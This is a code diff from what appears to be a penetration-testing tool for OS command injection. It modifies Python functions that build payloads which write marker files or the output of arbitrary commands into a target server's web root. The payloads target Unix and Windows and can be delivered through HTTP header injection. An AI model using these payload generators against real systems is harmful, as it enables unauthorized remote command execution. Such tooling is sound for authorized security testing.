@@ -34,7 +34,7 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
               ) 
   else:
     payload = (separator +
-              "echo " + TAG + ">" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + " "
+              "echo " + TAG + ">" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE
               ) 
 
   return payload
@@ -45,7 +45,7 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
 
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"open('" + OUTPUT_TEXTFILE + "', 'w').write('" + TAG + "')\""
+    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
     payload = (separator +
               "for /f \"delims=\" %i in ('cmd /c " + 
               python_payload +
@@ -53,7 +53,7 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
               )
   else:
     payload = (separator +
-              "$(python -c \"f = open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")"
+              "$(python -c \"f=open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\")"
                ) 
 
   if settings.USER_AGENT_INJECTION == True or \
@@ -61,7 +61,7 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
      settings.CUSTOM_HEADER_INJECTION == True :
     payload = payload.replace("\n", separator)
   else:
-    if not menu.options.base64:
+    if not settings.TAMPER_SCRIPTS['base64encode']:
       if settings.TARGET_OS != "win":
         payload = payload.replace("\n","%0d")
 
@@ -83,8 +83,13 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
               "\")\"') do @set /p =%i " + ">" + OUTPUT_TEXTFILE + " <nul"
               ) 
   else:
+    if settings.USER_AGENT_INJECTION == True or \
+       settings.REFERER_INJECTION == True or \
+       settings.CUSTOM_HEADER_INJECTION == True:
+      if not settings.DEL in cmd:
+        cmd = "echo $(" + cmd + ")"
     payload = (separator +
-              cmd + ">" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + " "
+              cmd + ">" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE
               )
 
   return payload
@@ -106,7 +111,7 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
                 )
   else:
     payload = (separator +
-              "$(python -c \"f = open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
+              "$(python -c \"f=open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
               )
 
   # New line fixation
@@ -115,7 +120,7 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
      settings.CUSTOM_HEADER_INJECTION == True:
     payload = payload.replace("\n", separator)
   else:
-    if not menu.options.base64:
+    if not settings.TAMPER_SCRIPTS['base64encode']:
       if settings.TARGET_OS != "win":
         payload = payload.replace("\n","%0d")
 
